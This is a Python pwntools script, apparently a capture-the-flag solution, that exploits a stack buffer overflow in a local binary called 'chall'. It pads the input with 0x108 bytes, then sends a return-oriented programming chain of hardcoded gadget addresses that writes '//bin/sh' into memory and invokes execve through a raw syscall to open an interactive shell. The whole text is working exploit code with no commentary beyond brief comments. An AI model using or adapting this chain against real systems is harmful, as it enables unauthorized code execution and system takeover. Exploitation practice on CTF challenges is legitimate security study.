from pwn import *

p = process('./chall')
e = ELF('./chall')


mov_prdi_rax = 0x0000000000400704 # mov qword ptr [rdi], rax
 
bin_sh = 0x68732f6e69622f2f
bss = 0x0000000000604D14
 
pop_rax = 0x0000000000400121
pop_rdi = 0x000000000040141c
pop_rsi_r15 = 0x000000000040141a
pop_rdx = 0x00000000004023f5
syscall = 0x00000000004003fc
 
pay = ''
pay += 'a'*0x108
pay += p64(pop_rax)
pay += p64(bin_sh)
 
pay += p64(pop_rdi)
pay += p64(bss)
 
pay += p64(mov_prdi_rax)    # [rdi] = "//bin/sh"
 
pay += p64(pop_rax)
pay += p64(59)
 
pay += p64(pop_rsi_r15)
pay += p64(0)
pay += p64(0)
 
pay += p64(pop_rdx)
pay += p64(0)
pay += p64(syscall)    # execve("/bin/sh", 0, 0)
 
p.sendline(pay)
 
 
p.interactive()